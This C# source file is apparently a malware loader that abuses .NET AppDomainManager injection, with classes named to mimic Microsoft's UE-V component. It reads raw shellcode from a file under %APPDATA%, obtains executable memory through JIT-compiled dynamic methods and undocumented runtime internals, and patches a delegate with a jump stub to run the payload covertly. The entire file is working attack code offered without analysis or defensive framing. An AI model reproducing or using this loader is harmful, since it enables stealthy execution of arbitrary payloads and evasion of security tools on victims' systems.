using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows;
using System.Reflection.Emit;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.IO;
using System.Linq;
using System.Threading;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.Windows.Forms;

public sealed class UevApp : AppDomainManager
{

    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        UevAppClass.Execute();
        return;
    }
}

public class UevAppClass
{
    public static void WriteMemory(IntPtr addr, IntPtr value)
    {
        var mngdRefCustomeMarshaller = typeof(System.String).Assembly.GetType("System.StubHelpers.MngdRefCustomMarshaler");
        var CreateMarshaler = mngdRefCustomeMarshaller.GetMethod("CreateMarshaler", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

        CreateMarshaler.Invoke(null, new object[] { addr, value });
    }

    public static IntPtr ReadMemory(IntPtr addr)
    {
        var stubHelper = typeof(System.String).Assembly.GetType("System.StubHelpers.StubHelpers");
        var GetNDirectTarget = stubHelper.GetMethod("GetNDirectTarget", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

        IntPtr unmanagedPtr = Marshal.AllocHGlobal(200);
        for (int i = 0; i < 200; i += IntPtr.Size)
        {
            Marshal.Copy(new[] { addr }, 0, unmanagedPtr + i, 1);
        }

        return (IntPtr)GetNDirectTarget.Invoke(null, new object[] { unmanagedPtr });
    }

    public static void CopyMemory(byte[] source, IntPtr dest)
    {
        // Pad to IntPtr length
        if ((source.Length % IntPtr.Size) != 0)
        {
            source = source.Concat<byte>(new byte[source.Length % IntPtr.Size]).ToArray();
        }

        GCHandle pinnedArray = GCHandle.Alloc(source, GCHandleType.Pinned);
        IntPtr sourcePtr = pinnedArray.AddrOfPinnedObject();
        for (int i = 0; i < source.Length; i += IntPtr.Size)
        {
            WriteMemory(dest + i, ReadMemory(sourcePtr + i));
        }

        Array.Clear(source, 0, source.Length);
    }

    public static IntPtr GenerateRWXMemory(int ByteCount)
    {
        AssemblyName AssemblyName = new AssemblyName("Assembly");
        AssemblyBuilder AssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(AssemblyName, AssemblyBuilderAccess.Run);
        ModuleBuilder ModuleBuilder = AssemblyBuilder.DefineDynamicModule("Module", true);
        MethodBuilder MethodBuilder = ModuleBuilder.DefineGlobalMethod("MethodName", MethodAttributes.Public | MethodAttributes.Static, typeof(void), new Type[] { });

        ILGenerator il = MethodBuilder.GetILGenerator();
        while (ByteCount > 0)
        {
            int length = 4;
            StringBuilder str_build = new StringBuilder();
            Random random = new Random();

            char letter;
            for (int i = 0; i < length; i++)
            {
                double flt = random.NextDouble();
                int shift = Convert.ToInt32(Math.Floor(25 * flt));
                letter = Convert.ToChar(shift + 65);
                str_build.Append(letter);
            }

            il.EmitWriteLine(str_build.ToString());
            ByteCount -= 18;
        }

        il.Emit(OpCodes.Ret);
        ModuleBuilder.CreateGlobalFunctions();
        RuntimeMethodHandle mh = ModuleBuilder.GetMethods()[0].MethodHandle;
        RuntimeHelpers.PrepareMethod(mh);
        return mh.GetFunctionPointer();
    }

    public delegate void Callback();

    public static void Action() { }

    delegate void Callingdelegate();

    //public static void Execute()
    //{
    //    return;
    //}
    public static void Execute()
    {
        if (AppDomain.CurrentDomain.FriendlyName == "UevApp")
        {
            return;
        }

        string shellcodePath = Environment.ExpandEnvironmentVariables("%APPDATA%\\CLView\\db.dat");
        if (!File.Exists(shellcodePath))
        {
            return;
        }

        byte[] shellcode = File.ReadAllBytes(shellcodePath);
        IntPtr pMem = GenerateRWXMemory(shellcode.Length);
        Callback myAction = new Callback(Action);
        IntPtr pMyAction = Marshal.GetFunctionPointerForDelegate(myAction);
        var jmpCode = new byte[] { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
        CopyMemory(shellcode, pMem);
        CopyMemory(jmpCode, pMyAction);
        WriteMemory(pMyAction + 2, pMem + 0xA6A0);
        Callingdelegate callingdelegate = Marshal.GetDelegateForFunctionPointer<Callingdelegate>(pMyAction);
        callingdelegate();
        while (true)
        {
            Thread.Sleep(1000000);
        }
    }
}